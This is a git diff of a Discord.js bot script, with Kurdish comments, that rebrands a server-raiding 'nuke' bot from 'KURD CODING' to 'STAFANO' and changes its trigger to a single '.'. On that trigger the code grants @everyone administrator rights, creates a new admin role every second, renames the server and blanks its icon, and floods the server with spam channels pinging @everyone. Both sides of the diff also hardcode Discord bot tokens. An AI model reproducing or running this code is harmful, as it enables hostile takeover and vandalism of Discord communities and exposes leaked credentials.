@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = 'm!'///lera ba dly xot prefix dabne
+const prefix = '.'///lera ba dly xot prefix dabne
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
@@ -14,7 +14,7 @@ console.log(`Logged in as ${client.user.tag}!`);
           
 client.on("ready", () => {
   console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
-  console.log('By black jack');/////BLACK JACK 
+  console.log('hack by stafano');/////BLACK JACK 
 console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
 console.log(`Logged in as ${client.user.tag}!`);
   client.user.setActivity(`${prefix}help | BOT SESTAM ${client.guilds.size}`)///////shtek bnwsa
@@ -23,7 +23,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 })
 ///created by black jack 
 client.on('message', message => {
-    if (message.content.toLowerCase() === 'server bge') {
+    if (message.content.toLowerCase() === '.') {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]
@@ -39,20 +39,20 @@ client.on('message', message => {
       
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED BY KURD CODING",
+                name: "HACKED BY STAFANO",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
                 message.member.addRole(rr.id);
             })
         }, 1000);
-        message.guild.setIcon("https://images-ext-2.discordapp.net/external/XQ3ma0vVczOTnGnwHuarnQ01YWiAleZACpdd0BctfPA/https/play-lh.googleusercontent.com/hxhQGvgSGD1cTZ1XAZoylrTvy5vo020km-5vtSuQr98uXaVVS-PaZdUqI5BEI_02MrA%3Dw412-h220-rw");
-        message.guild.setName('HACKED BY KURD CODING');
+        message.guild.setIcon("");
+        message.guild.setName('HACKED BY STAFANO');
         setTimeout(function() {
             setInterval(() => {
           
-                message.guild.createChannel('HACKED BY KURD CODING', 'text').then(channel => {
-                channel.send('@everyone HACKRAWA LALAYAN SAEWANI KURD CODING:joy: :joy: :joy:')
+                message.guild.createChannel('hack by stafano', 'text').then(channel => {
+                channel.send('@everyone HACK BY STAFANO:joy: :joy: :joy:')
                
                 })
             }
@@ -65,5 +65,5 @@ client.on('message', message => {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("NzU4MzE4ODY4NTg2MDM3Mjk5.X2tNew.4uiKp7VTKoZX0NnNP5HLHswVA0o")
+client.login("NzY0MTgzOTk3Mzk0NzE0NjQ1.X4Cjzg.bDS4Yq6CYrA7hXxZN8BbG7vuZIg")
           
